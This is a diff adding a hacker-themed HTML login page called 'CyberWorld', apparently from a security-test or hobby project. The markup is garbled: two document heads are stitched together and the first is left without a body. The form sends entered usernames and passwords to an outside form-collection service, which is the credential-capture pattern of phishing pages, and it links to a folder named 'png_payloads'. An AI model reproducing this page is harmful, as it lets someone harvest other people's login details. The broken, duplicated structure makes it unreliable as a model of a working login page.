@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberWorld Login</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #181c24; color: #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+    .login-box { background: #23283a; padding: 2em; border-radius: 10px; box-shadow: 0 0 20px #0008; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 0.7em; margin: 0.5em 0; border: none; border-radius: 5px; }
+    button { width: 100%; padding: 0.7em; background: #2e8bff; color: #fff; border: none; border-radius: 5px; font-size: 1em; cursor: pointer; }
+    button:hover { background: #1c5db6; }
+    h2 { margin-bottom: 1em; }
+  </style>
+</head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYBERWORLD // ENTER IF YOU DARE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background: linear-gradient(135deg, #0f2027 0%, #2c5364 100%);
+      color: #f8f8ff;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      letter-spacing: 1px;
+    }
+    .cyber-header {
+      font-size: 2.2em;
+      color: #00ffe7;
+      text-shadow: 0 0 10px #00ffe7, 0 0 40px #0ff, 0 0 80px #0ff;
+      margin-bottom: 0.2em;
+      font-family: 'Share Tech Mono', monospace;
+      letter-spacing: 2px;
+      text-align: center;
+    }
+    .cyber-sub {
+      color: #ff0055;
+      font-size: 1.1em;
+      margin-bottom: 1.5em;
+      text-shadow: 0 0 8px #ff0055, 0 0 20px #ff0055;
+      text-align: center;
+    }
+    .login-box {
+      background: rgba(20, 20, 40, 0.98);
+      border: 2px solid #00ffe7;
+      border-radius: 12px;
+      box-shadow: 0 0 40px #0ff8, 0 0 10px #ff0055;
+      padding: 2.5em 2em 2em 2em;
+      max-width: 350px;
+      width: 100%;
+      margin: 0 auto;
+      position: relative;
+    }
+    .skull {
+      width: 60px;
+      margin: 0 auto 1em auto;
+      display: block;
+      filter: drop-shadow(0 0 10px #ff0055);
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 0.8em;
+      margin: 0.7em 0;
+      border: 1px solid #00ffe7;
+      background: #181c24;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1em;
+      outline: none;
+      transition: border 0.2s;
+    }
+    input[type="text"]:focus, input[type="password"]:focus {
+      border: 1.5px solid #ff0055;
+    }
+    button {
+      width: 100%;
+      padding: 0.9em;
+      background: linear-gradient(90deg, #00ffe7 0%, #ff0055 100%);
+      color: #181c24;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.1em;
+      font-family: 'Share Tech Mono', monospace;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 1em;
+      box-shadow: 0 0 10px #00ffe7, 0 0 10px #ff0055;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #ff0055 0%, #00ffe7 100%);
+      color: #fff;
+    }
+    .warning {
+      color: #ff0055;
+      font-size: 1em;
+      margin-top: 1.5em;
+      text-align: center;
+      text-shadow: 0 0 8px #ff0055;
+    }
+    .payload-link {
+      display: block;
+      color: #00ffe7;
+      margin: 1.2em 0 0.2em 0;
+      text-align: center;
+      text-decoration: underline;
+      font-size: 1em;
+    }
+  </style>
+</head>
+<body>
+  <div class="cyber-header">CYBERWORLD</div>
+  <div class="cyber-sub">ENTER IF YOU DARE</div>
+  <div class="login-box">
+    <img class="skull" src="https://img.icons8.com/?size=100&id=MAtd2MbE865C&format=png&color=000000" alt="skull">
+    <form id="loginForm" method="POST" action="https://formspree.io/f/mwkgyyqg">
+      <input type="text" name="username" placeholder="Username" required><br>
+      <input type="password" name="password" placeholder="Password" required><br>
+      <button type="submit">LOG IN</button>
+    </form>
+    <div class="warning">This is a high-security test zone.</div>
+    <a class="payload-link" href="../png_payloads/" target="_blank">View Images</a>
+  </div>
+</body>
+</html>
